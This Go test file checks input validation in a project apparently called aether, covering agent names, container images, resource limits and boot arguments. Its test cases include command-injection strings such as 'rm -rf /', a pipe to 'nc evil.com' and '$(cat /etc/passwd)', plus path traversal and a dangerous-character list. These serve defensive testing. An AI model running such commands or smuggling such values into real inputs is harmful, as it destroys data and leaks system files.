package security_test

import (
	"strings"
	"testing"

	"github.com/dnakitare/aether/internal/api"
	apiPkg "github.com/dnakitare/aether/pkg/api"
)

// TestAgentNameValidation verifies agent name validation.
func TestAgentNameValidation(t *testing.T) {
	tests := []struct {
		name  string
		valid bool
	}{
		{"valid-agent", true},
		{"agent_123", true},
		{"Agent-Name-123", true},
		{"a", true},                      // Min length
		{"", false},                      // Empty
		{strings.Repeat("a", 65), false}, // Too long
		{"invalid name", false},          // Space
		{"invalid@name", false},          // Special char
		{"../agent", false},              // Path traversal
	}

	for _, tt := range tests {
		t.Run("Name: "+tt.name, func(t *testing.T) {
			err := api.ValidateAgentName(tt.name)

			if tt.valid && err != nil {
				t.Errorf("valid name %q was rejected: %v", tt.name, err)
			}

			if !tt.valid && err == nil {
				t.Errorf("invalid name %q was accepted", tt.name)
			}
		})
	}
}

// TestImageValidation verifies container image validation.
func TestImageValidation(t *testing.T) {
	tests := []struct {
		image string
		valid bool
	}{
		{"docker.io/library/nginx:latest", true},
		{"gcr.io/aether/app:v1.0", true},
		{"ghcr.io/org/repo:tag", true},
		{"nginx:latest", false},                      // No registry
		{"docker.io/library/nginx", false},           // No tag
		{"malicious.com/backdoor:latest", false},     // Untrusted registry
		{"docker.io/library/nginx; rm -rf /", false}, // Injection attempt
	}

	for _, tt := range tests {
		t.Run("Image: "+tt.image, func(t *testing.T) {
			err := api.ValidateImage(tt.image)

			if tt.valid && err != nil {
				t.Errorf("valid image %q was rejected: %v", tt.image, err)
			}

			if !tt.valid && err == nil {
				t.Errorf("invalid image %q was accepted", tt.image)
			}
		})
	}
}

// TestResourceValidation verifies resource limits validation.
func TestResourceValidation(t *testing.T) {
	tests := []struct {
		name      string
		resources apiPkg.ResourceLimits
		valid     bool
	}{
		{
			name: "Valid resources",
			resources: apiPkg.ResourceLimits{
				CPUCount: 2,
				MemoryMB: 2048,
				DiskMB:   10240,
			},
			valid: true,
		},
		{
			name: "CPU too low",
			resources: apiPkg.ResourceLimits{
				CPUCount: 0,
				MemoryMB: 2048,
				DiskMB:   10240,
			},
			valid: false,
		},
		{
			name: "CPU too high",
			resources: apiPkg.ResourceLimits{
				CPUCount: 128,
				MemoryMB: 2048,
				DiskMB:   10240,
			},
			valid: false,
		},
		{
			name: "Memory too low",
			resources: apiPkg.ResourceLimits{
				CPUCount: 2,
				MemoryMB: 64,
				DiskMB:   10240,
			},
			valid: false,
		},
		{
			name: "Memory too high",
			resources: apiPkg.ResourceLimits{
				CPUCount: 2,
				MemoryMB: 200000,
				DiskMB:   10240,
			},
			valid: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := api.ValidateResources(tt.resources)

			if tt.valid && err != nil {
				t.Errorf("valid resources were rejected: %v", err)
			}

			if !tt.valid && err == nil {
				t.Errorf("invalid resources were accepted")
			}
		})
	}
}

// TestBootArgsValidation verifies boot arguments validation.
func TestBootArgsValidation(t *testing.T) {
	tests := []struct {
		args  string
		valid bool
	}{
		{"console=ttyS0 reboot=k panic=1", true},
		{"quiet splash", true},
		{"", true},                         // Empty is OK
		{"args; rm -rf /", false},          // Semicolon
		{"args && evil", false},            // &&
		{"args | nc evil.com", false},      // Pipe
		{"args `whoami`", false},           // Backtick
		{"args $(cat /etc/passwd)", false}, // Command substitution
		{string(make([]byte, 513)), false}, // Too long
	}

	for _, tt := range tests {
		t.Run("Args: "+tt.args[:min(20, len(tt.args))], func(t *testing.T) {
			err := validateBootArgs(tt.args)

			if tt.valid && err != nil {
				t.Errorf("valid boot args were rejected: %v", err)
			}

			if !tt.valid && err == nil {
				t.Errorf("invalid boot args were accepted")
			}
		})
	}
}

// Helper functions

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func validateBootArgs(args string) error {
	if len(args) > 512 {
		return &ValidationError{Message: "boot args too long"}
	}
	dangerous := []string{";", "|", "&", "`", "$", "(", ")", "<", ">", "\n", "\r"}
	for _, char := range dangerous {
		if strings.Contains(args, char) {
			return &ValidationError{Message: "dangerous character in boot args"}
		}
	}
	return nil
}
